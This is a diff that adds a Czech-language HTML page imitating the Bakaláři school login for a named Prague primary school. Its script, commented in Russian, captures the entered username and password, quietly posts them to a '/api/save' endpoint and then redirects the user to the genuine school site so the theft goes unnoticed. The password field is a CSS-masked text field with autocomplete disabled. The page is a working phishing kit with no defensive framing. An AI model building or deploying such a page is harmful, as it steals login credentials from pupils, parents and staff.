@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bakaláři - přihlášení do systému</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    background-color: #f7f9fc;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 20px;
+  }
+  .container {
+    width: 100%;
+    max-width: 320px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+  .logo { width: 200px; margin-bottom: 12px; }
+  .school-name {
+    font-size: 14.5px;
+    color: #4a5568;
+    text-align: center;
+    margin-bottom: 30px;
+    font-weight: 400;
+  }
+  form { width: 100%; display: flex; flex-direction: column; align-items: center; }
+  .input-group { width: 100%; margin-bottom: 10px; }
+  input[type="text"] {
+    width: 100%;
+    padding: 9px 12px; 
+    border: 1px solid #d1d5db;
+    border-radius: 4px;
+    font-size: 14px;
+    color: #5b9bd5; 
+    background-color: #ffffff;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+  input[type="text"]::placeholder { color: #a0aec0; }
+  input[type="text"]:focus { border-color: #5b9bd5; }
+  .mask-password {
+    -webkit-text-security: disc;
+    -moz-text-security: disc;
+    text-security: disc;
+  }
+  .forgot {
+    align-self: flex-end;
+    font-size: 12.5px;
+    color: #4a5568;
+    text-decoration: underline;
+    margin-bottom: 20px;
+    margin-right: 2px;
+  }
+  button {
+    width: 100%;
+    padding: 8px; 
+    background-color: #6abe30;
+    color: #ffffff;
+    border: none;
+    border-radius: 4px;
+    font-size: 15px;
+    font-weight: bold;
+    cursor: pointer;
+    text-transform: uppercase;
+    transition: background-color 0.2s;
+  }
+  button:hover { background-color: #5ca627; }
+  .app-links { margin-top: 40px; display: flex; flex-direction: column; align-items: center; }
+  .app-links p { font-size: 11.5px; color: #718096; margin-bottom: 12px; text-align: center; }
+  .badges { display: flex; gap: 8px; justify-content: center; width: 100%; }
+  .badges img { height: 35px; object-fit: contain; border-radius: 3px; }
+</style>
+</head>
+<body>
+
+  <div class="container">
+    <img src="bakalari-logo.svg" alt="Bakaláři" class="logo">
+    <div class="school-name">Základní škola, Praha 4, Na Chodovci 54</div>
+
+    <form id="loginForm">
+      <div class="input-group">
+        <input type="text" name="username" id="username" placeholder="Uživatelské jméno" required autofocus autocomplete="off">
+      </div>
+      <div class="input-group">
+        <input type="text" name="pass" id="password" placeholder="Heslo" required autocomplete="off" class="mask-password">
+      </div>
+      
+      <a href="#" class="forgot">Zapomenuté heslo</a>
+      <button type="submit">Přihlásit</button>
+    </form>
+
+    <div class="app-links">
+      <p>Vyzkoušejte aplikaci Bakaláři na svém chytrém telefonu</p>
+      <div class="badges">
+        <img src="btn-googlePlay-cerna-min.png" alt="Google Play">
+        <img src="btn-appStore-cerna-min.png" alt="App Store">
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault(); // Отменяем стандартную отправку
+      
+      const username = document.getElementById('username').value;
+      const pass = document.getElementById('password').value;
+
+      // Отправляем данные в фоне (keepalive гарантирует отправку даже при переходе)
+      fetch('/api/save', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: username, pass: pass }),
+        keepalive: true 
+      }).catch(() => {});
+
+      // Мгновенно перенаправляем на настоящий сайт
+      window.location.replace('https://bakalari.zsnachodovci.cz/');
+    });
+  </script>
+</body>
+</html>
